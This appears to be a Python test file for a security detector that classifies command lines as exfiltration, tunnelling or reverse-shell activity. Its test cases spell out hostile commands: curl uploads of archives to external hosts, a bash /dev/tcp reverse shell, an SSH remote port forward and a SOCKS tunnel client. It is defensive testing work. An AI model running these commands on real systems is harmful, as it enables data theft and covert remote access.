"""Exfiltration, tunnelling and reverse-shell signals are generic and decisive."""
from bluesec1_agent.decision_guard import decisive_signals, detect_attack_signals, egress_signals


def names(cmd):
    return {(s.name, s.score) for s in egress_signals("p", cmd)}


def test_archive_upload_to_external_is_decisive():
    for cmd in (r"curl.exe -T C:\Users\u\transfer255.zip https://media-docs.org/api/upload/1",
                "curl -X POST -F file=@/tmp/bundle-41.tar.gz https://198.51.100.31/intake/upload",
                r"curl.exe -T C:\Windows\Temp\stage\dataset-9.7z.006 https://assetsvendor.com/docs/x"):
        assert decisive_signals(egress_signals("p", cmd)), cmd


def test_internal_or_download_is_not_flagged():
    assert names("curl -F file=@r.zip https://share.corp.local/up") == set()
    assert names("curl -T backup.7z https://10.1.2.3/upload") == set()
    assert names("curl https://example.com/x.zip -o x.zip") == set()
    assert names("ssh -T -D 54886 192.168.61.9 bash --login -c bash") == set()


def test_plain_file_upload_to_external_domain_is_only_context():
    sig = egress_signals("p", "curl -F file=@report.pdf https://partner.example.com/in")
    assert sig and not decisive_signals(sig)


def test_tunnel_and_reverse_shell():
    assert decisive_signals(egress_signals("p", r"C:\Users\a\AppData\Local\Temp\d.exe client 198.51.100.20:22754 R:socks"))
    assert decisive_signals(egress_signals("p", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"))
    assert decisive_signals(egress_signals("p", "ssh -N -R 9000:localhost:3389 user@203.0.113.9"))


def test_detect_attack_signals_reads_process_cmdline():
    nodes = {"p1": {"type": "linux_process", "properties": {
        "cmdline": "curl -X POST -F file=@/tmp/b.tar.gz https://198.51.100.31/u"}}}
    assert decisive_signals(detect_attack_signals(nodes, {}))
